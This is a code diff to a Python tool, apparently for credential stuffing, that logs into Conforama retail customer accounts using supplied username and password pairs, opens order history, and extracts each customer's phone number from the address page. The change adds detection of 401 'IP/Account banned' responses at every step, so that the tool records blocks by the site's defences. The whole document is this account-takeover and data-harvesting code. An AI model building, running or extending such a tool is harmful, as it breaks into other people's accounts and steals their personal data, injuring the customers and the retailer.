@@ -14,12 +14,13 @@ from conforama_session import ConforamaSession
 class PhoneResult:
     """Result object for phone extraction"""
     def __init__(self, username: str, password: str = "", phone: Optional[str] = None, 
-                 success: bool = False, error: Optional[str] = None):
+                 success: bool = False, error: Optional[str] = None, banned: bool = False):
         self.username = username
         self.password = password
         self.phone = phone
         self.success = success
         self.error = error
+        self.banned = banned
         self.timestamp = time.time()
 
 
@@ -41,21 +42,32 @@ class PhoneExtractor:
         try:
             with ConforamaSession() as session:
                 # Step 1: Load login page
-                if not session.get_login_page():
+                login_result = session.get_login_page()
+                if login_result == "banned":
+                    return PhoneResult(username, password, error="IP/Account banned (401)", banned=True)
+                if not login_result:
                     return PhoneResult(username, password, error="Failed to load login page")
                 
                 # Step 2: Perform login
-                if not session.perform_login(username, password):
+                login_result = session.perform_login(username, password)
+                if login_result == "banned":
+                    return PhoneResult(username, password, error="IP/Account banned (401)", banned=True)
+                if not login_result:
                     return PhoneResult(username, password, error="Login failed")
                 
                 # Step 3: Access order history
-                if not session.get_order_history():
+                order_result = session.get_order_history()
+                if order_result == "banned":
+                    return PhoneResult(username, password, error="IP/Account banned (401)", banned=True)
+                if not order_result:
                     return PhoneResult(username, password, error="Failed to access order history")
                 
                 # Step 4: Get phone number from address page
                 phone = session.get_customer_address()
                 
-                if phone:
+                if phone == "banned":
+                    return PhoneResult(username, password, error="IP/Account banned (401)", banned=True)
+                elif phone:
                     result = PhoneResult(username, password, phone=phone, success=True)
                     return result
                 else:
